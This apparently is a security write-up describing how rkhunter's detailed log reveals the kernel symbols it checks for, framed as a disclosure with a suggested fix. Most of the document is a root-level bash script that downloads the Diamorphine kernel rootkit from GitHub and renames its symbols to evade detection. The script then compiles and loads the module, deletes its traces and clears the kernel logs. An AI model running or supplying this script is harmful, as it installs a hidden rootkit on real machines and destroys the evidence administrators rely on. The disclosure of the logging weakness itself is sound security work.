# Bypass rkhunter

##
#
https://gist.github.com/MatheuZSecurity/16ef0219db8f85f49f945a25d5eb42d7
#
##

## How does this "vuln/bypass/misconfig" work?

We managed to take advantage of rkhunter's own logs to do a bypass, it shows the signatures, the strings it looks for, and saves all this in the log file "/var/log/rkhunter.log", so you just have read permissions on the file "/var/log/rkhunter.log" and it will know exactly all the strings, signatures, everything it looks for in directories, files, etc, in order to be able to detect if there is any rootkit/malware in your machine.

And with that we can take advantage of that, to be able to modify our malware/rootkit and successfully bypass rkhunter, because we know exactly what kind of signatures, strings, etc. it looks for.

This is a very common technique for bypassing signature-based security protections.

A possible correction or patch would be not to show all the signatures, directories and strings that it is looking for, but rather just alerting whether or not there is any malware/rootkit on the machine where rkhunter is running and saving this both in a log file and print on screen.

This is affected in rkhunter versions 1.4.6 and 1.4.4.

## PoC Video

[Youtube PoC Video](https://www.youtube.com/watch?v=etHt1TNAgs8)

## Example shell script to bypass

```
#!/bin/bash

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

command -v insmod >/dev/null 2>&1 || { echo >&2 "[ERROR] insmod command not found. Please install it."; exit 1; }
command -v gcc >/dev/null 2>&1 || { echo >&2 "[ERROR] gcc command not found. Please install it."; exit 1; }

dir() {
	mkdir -p  /var/tmp/.cache
}

get_rootkit(){
	git clone https://github.com/m0nad/Diamorphine /var/tmp/.cache
}

modify_rk(){
	mv /var/tmp/.cache/diamorphine.c /var/tmp/.cache/rk.c
	mv /var/tmp/.cache/diamorphine.h /var/tmp/.cache/rk.h
	sed -i 's/diamorphine_secret/demonized/g' /var/tmp/.cache/rk.h
	sed -i 's/diamorphine/demonizedmod/g' /var/tmp/.cache/rk.h
	sed -i 's/63/62/g' /var/tmp/.cache/rk.h
	sed -i 's/diamorphine.h/rk.h/g' /var/tmp/.cache/rk.c
	sed -i 's/diamorphine_init/rk_init/g' /var/tmp/.cache/rk.c
	sed -i 's/diamorphine_cleanup/rk_cleanup/g' /var/tmp/.cache/rk.c
	sed -i 's/diamorphine.o/rk.o/g' /var/tmp/.cache/Makefile
	sed -i 's/module_hide/module_h1dd3/g' /var/tmp/.cache/rk.c
	sed -i 's/module_hidden/module_h1dd3n/g' /var/tmp/.cache/rk.c
	sed -i 's/is_invisible/e_invisible/g' /var/tmp/.cache/rk.c
	sed -i 's/hacked_getdents/hack_getdents/g' /var/tmp/.cache/rk.c
	sed -i 's/hacked_kill/h4ck_kill/g' /var/tmp/.cache/rk.c
}

make_rk(){
	make -C /var/tmp/.cache/
}

load_rk(){
	insmod /var/tmp/.cache/rk.ko
}

clean_files(){
	make clean -C /var/tmp/.cache/
	rm -rf /var/tmp/.cache
}

remove_logs(){
	dmesg -C
	echo "" > /var/log/kern.log
}

clear

dir && get_rootkit && modify_rk && make_rk && load_rk && clean_files && remove_logs /

clear

scs="[*] Success! Rootkit has been implanted. [*]"

for i in $(seq 1 ${#scs}); do
        echo -ne "${scs:i-1:1}"
        sleep 0.05
done

echo -ne "\n"

clear
```

After running the script, use: " kill -62 0 && lsmod|grep rk " To make our module reappear, and even with the module reappeared again, rkhunter will not be able to detect it


Now in the logs rkhunter looks for the following diamorphine rootkit strings:
```
[16:02:59]
[16:02:59] Checking for Diamorphine LKM...
[16:03:00]   Checking for kernel symbol 'diamorphine'        [ Not found ]
[16:03:00]   Checking for kernel symbol 'module_hide'        [ Not found ]
[16:03:00]   Checking for kernel symbol 'module_hidden'      [ Not found ]
[16:03:00]   Checking for kernel symbol 'is_invisible'       [ Not found ]
[16:03:00]   Checking for kernel symbol 'hacked_getdents'    [ Not found ]
[16:03:01]   Checking for kernel symbol 'hacked_kill'        [ Not found ]
[16:03:01] Diamorphine LKM                                   [ Not found ]
[16:03:01]
```


We managed to bypass rkhunter because it shows the signatures, strings, etc. And with that we managed to take advantage of it to be able to modify our code, thus bypassing rkhunter thanks to him because of his logs.


## Summary

Well, in summary, this type of "vulnerability/misconfig/bypass" is only possible because rkhunter saves the logs in "/var/log/rkhunter.log", so far so good, however, it shows the strings, directories, signatures, etc., is what makes it possible to bypass.

Thinking about a real scenario, an attacker can download rkhunter on his own machine, being able to view the logs and know everything that rkhunter looks for to detect a malware/rootkit, and through this, with the attacker knowing where rkhunter can "detect" " the rootkit, the attacker will be able to modify the strings, exact functions of your rootkit/malware to use it in a real environment."
